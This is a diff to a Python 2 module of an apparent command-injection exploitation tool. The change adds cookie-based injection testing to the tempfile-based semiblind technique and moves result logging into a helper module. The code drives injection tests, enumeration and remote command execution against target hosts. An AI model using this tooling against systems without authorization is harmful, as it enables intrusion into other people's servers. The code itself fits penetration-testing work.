@@ -23,7 +23,9 @@ import urllib
 import urllib2
   
 from src.utils import menu
+from src.utils import logs
 from src.utils import settings
+
 from src.thirdparty.colorama import Fore, Back, Style, init
 
 from src.core.requests import headers
@@ -44,7 +46,7 @@ from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_fi
 #-------------------------------------------------
 def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method):
   
-  counter = 0
+  counter = 1
   vp_flag = True
   no_result = True
   is_encoded = False
@@ -52,7 +54,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method):
   export_injection_info = False
   injection_type = "Semiblind-based Command Injection"
   technique = "tempfile-based injection technique"
-      
+  
   # Check if defined "--maxlen" option.
   if menu.options.maxlen:
     maxlen = menu.options.maxlen
@@ -95,9 +97,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method):
 
         # Tempfile-based decision payload (check if host is vulnerable).
         if alter_shell :
-
           payload = tfb_payloads.decision_alter_shell(separator, output_length, TAG, OUTPUT_TEXTFILE, delay, http_request_method)
-  
         else:
           payload = tfb_payloads.decision(separator, output_length, TAG, OUTPUT_TEXTFILE, delay, http_request_method)
 
@@ -106,8 +106,15 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method):
           if separator == ";" or separator == "&&" or separator == "||":
             sys.stdout.write("\n" + Fore.GREY + payload.replace("\n", "\\n") + Style.RESET_ALL)
             
-        # Check if target host is vulnerable
-        how_long, vuln_parameter = tfb_injector.injection_test(payload, http_request_method, url)
+        # Cookie Injection
+        if settings.COOKIE_INJECTION == True:
+          # Check if target host is vulnerable to cookie injection.
+          vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
+          how_long = tfb_injector.cookie_injection_test(url, vuln_parameter, payload)
+        else:
+          # Check if target host is vulnerable.
+          how_long, vuln_parameter = tfb_injector.injection_test(payload, http_request_method, url)
+
         if not menu.options.verbose:
           percent = ((num_of_chars*100)/total)
           if how_long >= delay:
@@ -149,59 +156,28 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method):
         found = True
         no_result = False
         
+        if settings.COOKIE_INJECTION == True: 
+          http_request_method = "cookie"
+          found_vuln_parameter = vuln_parameter
+        else:
+          if http_request_method == "GET":
+            found_vuln_parameter = parameters.vuln_GET_param(url)
+          else :
+            found_vuln_parameter = vuln_parameter
+
         # Print the findings to log file.
         if export_injection_info == False:
-          output_file = open(filename + ".txt", "a")
-          output_file.write("\n(+) Type : " + injection_type)
-          output_file.write("\n(+) Technique : " + technique.title())
-          output_file.close()
-          export_injection_info = True
-  
-        if http_request_method == "GET":
-          # Print the findings to log file
-          if vp_flag == True:
-            output_file = open(filename + ".txt", "a")
-            output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
-            output_file.write("\n")
-            vp_flag = False
-            output_file.close()
-            
-          counter = counter + 1
-          output_file = open(filename + ".txt", "a")
-          output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
-          output_file.close()
-            
-          #Vulnerabe Parameter
-          GET_vuln_param = parameters.vuln_GET_param(url)
-          
-          # Print the findings to terminal.
-          print Style.BRIGHT + "\n(!) The ("+ http_request_method + ") '" + Style.UNDERLINE + GET_vuln_param + Style.RESET_ALL + Style.BRIGHT + "' parameter is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
-          print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
-          print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
-          print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", urllib.unquote_plus(payload.replace("\n", "\\n"))) + Style.RESET_ALL
-            
-        else :
-          # Print the findings to log file
-          if vp_flag == True:
-            output_file = open(filename + ".txt", "a")
-            output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
-            output_file.write("\n")
-            vp_flag = False
-            output_file.close()
-            
-          counter = counter + 1
-          output_file = open(filename + ".txt", "a")
-          output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
-          output_file.close()
-            
-          #Vulnerabe Parameter
-          POST_vuln_param = vuln_parameter
-          
-          # Print the findings to terminal.
-          print Style.BRIGHT + "\n(!) The ("+ http_request_method + ") '" + Style.UNDERLINE + POST_vuln_param + Style.RESET_ALL + Style.BRIGHT + "' parameter is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
-          print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
-          print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
-          print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL
+          export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
+        if vp_flag == True:
+          vp_flag = logs.add_parameter(vp_flag, filename, http_request_method, vuln_parameter, payload)
+        logs.upload_payload(filename, counter, payload) 
+        counter = counter + 1
+        
+        # Print the findings to terminal.
+        print Style.BRIGHT + "\n(!) The ("+ http_request_method + ") '" + Style.UNDERLINE + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + "' parameter is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
+        print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
+        print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
+        print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL
         
         # Check for any enumeration options.
         tfb_enumeration.do_check(separator, maxlen, TAG, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
@@ -223,8 +199,9 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method):
                   
                 else:
                   # The main command injection exploitation.
+                  # Cookie Injection
                   check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
-                  
+
                   if menu.options.verbose:
                     print ""
                   if output != "" and check_how_long != 0 :
@@ -261,7 +238,11 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method):
   else :
     sys.stdout.write("\r")
     sys.stdout.flush()
-    
+
+"""
+The exploitation function.
+(call the injection handler)
+"""
 def exploitation(url, delay, filename, tmp_path, http_request_method):
     if tfb_injection_handler(url, delay, filename, tmp_path, http_request_method) == False:
       return False
